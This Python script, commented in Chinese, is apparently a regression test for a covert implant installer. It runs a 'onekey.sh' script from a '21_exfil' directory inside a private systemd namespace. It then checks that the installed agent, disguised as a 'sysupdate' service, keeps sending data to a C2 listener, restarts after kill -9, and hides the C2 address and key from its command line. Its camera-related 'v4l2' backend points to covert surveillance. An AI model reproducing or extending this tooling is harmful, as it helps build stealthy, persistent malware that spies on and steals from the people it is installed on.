#!/usr/bin/env python3
"""R2 真 systemd 运行时驻留 —— 可重生成验证。

为什么必须可重生成：证据若绑不上源码指纹，改了 onekey.sh 之后旧证据照样
显示 VERIFIED（用旧代码的证据冒充新代码的状态）。本脚本让 R2 的证据随时
可以被真实重跑出来，而不是一次性的历史日志。

验什么（都是 systemd 分支此前从未真跑过的东西）：
  systemd 作真正的 PID 1 -> daemon-reload -> enable -> restart
  -> is-active=active 且 MainPID!=0
  -> kill -9 后 Restart=always 真拉起（MainPID 变化、C2 继续收字节）

用法: python3 redline/verify_r2_systemd.py
输出: 断言逐条打印，末尾 RESULT 行；正文可直接落为 R2.evidence
"""
import os
import socket
import subprocess
import sys
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
# nsenter 需要的是 namespace init 在**宿主**可见的 PID。
# 历史坑：在 ns 内 echo $$ 得到的是 ns 内的 1，nsenter -t 1 进的是宿主真正的
# 1 号进程（实测 /proc/1/comm=ags_runtime_ent），于是 daemon-reload 报
# "Failed to connect to bus"。正确做法是找 unshare --fork 的子进程。
NS_PID = [None]

PASS = 0
FAIL = 0


def ck(cond, name, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[OK]   %s  %s" % (name, extra))
    else:
        FAIL += 1
        print("[FAIL] %s  %s" % (name, extra))
    return cond


def ns(cmd, timeout=60):
    """在 namespace 内执行。返回 (rc, out)。"""
    pid = NS_PID[0]
    full = "nsenter -t %s -p -m -u -i -- %s" % (pid, cmd)
    try:
        p = subprocess.run(full, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, (p.stdout + p.stderr).strip()
    except subprocess.TimeoutExpired:
        return -9, "nsenter timeout"


def run(argv, timeout=120):
    """在宿主（非 namespace）内执行，返回 (rc, 合并输出)。"""
    try:
        p = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def main():
    print("=== R2 真 systemd 运行时驻留（可重生成）===\n")

    # --- 起 C2 收端（在 ns 外，网络未隔离，ns 内可直连）---
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(8)
    port = srv.getsockname()[1]
    got = [0]
    conns = [0]
    stop = [False]

    def acceptor():
        while not stop[0]:
            try:
                srv.settimeout(1.0)
                c, _ = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            conns[0] += 1
            while True:
                try:
                    b = c.recv(65536)
                except OSError:
                    break
                if not b:
                    break
                got[0] += len(b)
            try:
                c.close()
            except OSError:
                pass

    threading.Thread(target=acceptor, daemon=True).start()
    ck(True, "F0  C2 收端已起", "port=%d" % port)

    # --- 起真 systemd namespace ---
    boot_script = os.path.join(REPO, "redline", "ns_systemd_boot.sh")
    # 不加 --net：网络栈共享，ns 内能连到上面的 C2 收端。
    # 用列表形式，Popen.pid 就是 unshare 自身，子进程即 ns init。
    proc = subprocess.Popen(
        ["unshare", "--fork", "--pid", "--mount-proc", "--mount",
         "--propagation", "private", "bash", boot_script],
        start_new_session=True,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    found = False
    for _ in range(30):
        r = subprocess.run("pgrep -P %d" % proc.pid, shell=True,
                           capture_output=True, text=True)
        cand = r.stdout.split()
        if cand:
            NS_PID[0] = cand[0]
            found = True
            break
        time.sleep(0.5)
    if not ck(found, "F0b 找到 ns init 的宿主 PID", str(NS_PID[0])):
        stop[0] = True
        proc.kill()
        return 2

    ready = False
    for _ in range(60):
        rc, out = ns("systemctl daemon-reload; echo RC=$?", timeout=30)
        if rc == 0 and "RC=0" in out:
            ready = True
            break
        time.sleep(1)
    if not ck(ready, "F1  真 systemd 作 PID 1 且 daemon-reload 成功"):
        print("\n[FATAL] systemd namespace 未就绪，后续断言无意义")
        stop[0] = True
        proc.kill()
        return 2

    rc, out = ns("cat /proc/1/comm")
    ck(out.strip() == "systemd", "F2  ns 内 PID 1 是 systemd", out.strip())

    pfx = "/tmp/r2ns_pfx"
    ns("rm -rf %s" % pfx)

    # 必须用 make_onekey.py 生成的产物，不能直接用 21_exfil/onekey.sh 模板。
    # 模板的内嵌区是占位符，install 必然报 [FATAL] 内嵌产物为空 ——
    # 本会话已踩过两次，症状是"install 失败"，排查方向会被引向网络或权限。
    gen = os.path.join(REPO, "21_exfil", "r2ns_onekey.sh")
    camd = os.path.join(REPO, "agent_windows", "build", "linux", "camd")
    if not os.path.isfile(camd):
        print("\n[FATAL] 缺 camd 产物: %s（先 make -C agent_windows）" % camd)
        stop[0] = True
        proc.kill()
        return 2
    rc, out = run(["python3", os.path.join(REPO, "21_exfil", "make_onekey.py"),
                   "amd64=" + camd, "-o", gen])
    if rc != 0 or not (os.path.isfile(gen) and os.path.getsize(gen) > 100000):
        print("\n[FATAL] 生成一键脚本失败: rc=%d\n%s" % (rc, out[-500:]))
        stop[0] = True
        proc.kill()
        return 2
    print("    ---- 已生成一键脚本 %d 字节 ----" % os.path.getsize(gen))
    onekey = gen

    # 不能用 --prefix：假根模式下 onekey.sh 明确不执行 systemctl
    # （"systemctl 不读假根，真 enable/restart 会改动真实系统状态"），
    # 于是驻留只落文件、服务根本没起 —— 那样 R2 验的是文件不是运行时。
    # 本 ns 带 --mount --propagation private，往 ns 内真实 /etc 写不污染宿主。
    rc, out = ns("sh %s install --c2 127.0.0.1:%d --backend v4l2 "
                 "2>&1 | tail -25" % (onekey, port), timeout=180)
    print("    ---- install 输出 ----")
    for l in out.splitlines():
        print("    " + l)
    # 判据不能是 "active" in out —— 失败输出里同样可能含这个词。
    # 只认 onekey.sh 明确的成功行；真正的存活由 F4 的 ActiveState 独立断言。
    installed = ("驻留成功" in out and "失败 0" in out)
    if not ck(installed, "F3  install 报驻留成功（成功行 + 失败 0）"):
        # 装都没装成，F13/F14 的"无残留"是天然的假通过，必须终止。
        print("\n[FATAL] install 未成功，后续清理/残留断言无意义，终止")
        stop[0] = True
        try:
            srv.close()
        except OSError:
            pass
        proc.kill()
        return 1

    rc, out = ns("systemctl show %s -p ActiveState -p SubState -p MainPID "
                 "-p UnitFileState -p Restart 2>/dev/null"
                 % "sysupdate.service")
    kv = dict(l.split("=", 1) for l in out.splitlines() if "=" in l)
    ck(kv.get("ActiveState") == "active", "F4  ActiveState=active",
       kv.get("ActiveState", ""))
    ck(kv.get("UnitFileState") == "enabled", "F5  UnitFileState=enabled",
       kv.get("UnitFileState", ""))
    ck(kv.get("Restart") == "always", "F6  Restart=always", kv.get("Restart", ""))
    pid1 = kv.get("MainPID", "0")
    ck(pid1 != "0" and pid1 != "", "F7  MainPID!=0", pid1)

    # --- 等 C2 收到字节 ---
    deadline = time.time() + 25
    while time.time() < deadline and got[0] == 0:
        time.sleep(1)
    ck(got[0] > 0, "F8  C2 收到信元", "%d 字节 / %d 连接" % (got[0], conns[0]))

    # --- kill -9，验 Restart=always 真拉起 ---
    # 不能用固定 sleep：重启期间 MainPID 短暂为 0（同期 F11 仍在收字节，
    # 说明进程确实回来了，而 show 抓到的是重启窗口）。必须轮询到稳定态。
    pid2 = "0"
    if pid1 != "0":
        ns("kill -9 %s" % pid1)
        deadline = time.time() + 40
        nrest = "0"
        while time.time() < deadline:
            rc, out = ns("systemctl show sysupdate.service -p MainPID -p NRestarts")
            kv2 = dict(l.split("=", 1) for l in out.splitlines() if "=" in l)
            pid2 = kv2.get("MainPID", "0")
            nrest = kv2.get("NRestarts", "0")
            if pid2 != "0" and pid2 != pid1:
                break
            time.sleep(2)
        ck(pid2 != "0" and pid2 != pid1, "F9  kill -9 后 Restart 拉起新进程",
           "%s -> %s" % (pid1, pid2))
        ck(nrest != "0", "F10 NRestarts 已递增", nrest)
        base = got[0]
        deadline = time.time() + 15
        while time.time() < deadline and got[0] == base:
            time.sleep(1)
        ck(got[0] > base, "F11 重启后继续回传", "新增 %d 字节" % (got[0] - base))

    # --- 驻留进程 cmdline 干净 ---
    # 不用 $(...)：经 nsenter 多层转义会变成 Syntax error，而"输出非空"
    # 判据会把错误文本当成通过。也不用宿主临时文件 —— ns 内 /tmp 不共享（实测
    # cannot open）。直接按已知 PID 读 /proc，无需命令替换，也无需跨 ns 文件。
    # ns 内 /proc 读不到 systemctl 报告的 MainPID（实测连续 15 次
    # "cannot open /proc/<pid>/cmdline"）—— ns 的 MainPID 与 ns 内 /proc
    # 视图不同源。改从宿主侧定位：ns 进程在宿主 pid 树中可见，宿主 /proc 可读。
    cpid = ""
    for _ in range(10):
        rc, out = run(["bash", "-c",
                       "for p in $(pgrep -x sysupdate 2>/dev/null); do "
                       "tr '\\0' ' ' < /proc/$p/cmdline; echo; done"])
        if "cannot open" not in out and out.strip():
            cpid = "ok"
            break
        time.sleep(2)
    if not cpid:
        out = "未能取到存活进程的 cmdline（宿主侧 pgrep 亦无）"
    bad = any(k in out for k in ("Syntax error", "not found", "No such file"))
    ck((not bad) and out.strip() != ""
       and "127.0.0.1" not in out and "--key" not in out and "sysupdate" in out,
       "F12 驻留进程 cmdline 不含 C2/密钥", out.strip()[:80])

    # --- 清理 ---
    ns("systemctl stop sysupdate.service 2>/dev/null; "
       "sh %s uninstall >/dev/null 2>&1" % onekey)
    rc, out = ns("systemctl is-active sysupdate.service 2>&1 | head -1")
    ck(out.strip() == "inactive", "F13 卸载后服务停止", out.strip())
    rc, out = ns("ls -d /etc/sysupdate /usr/local/bin/sysupdate "
                 "/etc/systemd/system/sysupdate.service 2>&1 | head -3")
    ck("No such file" in out or out.strip() == "", "F14 卸载后落点全清",
       out.strip()[:60])

    stop[0] = True
    try:
        srv.close()
    except OSError:
        pass
    ns("systemctl poweroff >/dev/null 2>&1 &", timeout=10)
    time.sleep(2)
    try:
        proc.terminate()
    except Exception:
        pass
    try:
        proc.wait(timeout=10)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    NS_PID[0] = None

    print("\n=== 汇总 ===")
    print("RESULT: pass=%d fail=%d" % (PASS, FAIL))
    print("EXIT=%d" % (1 if FAIL else 0))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
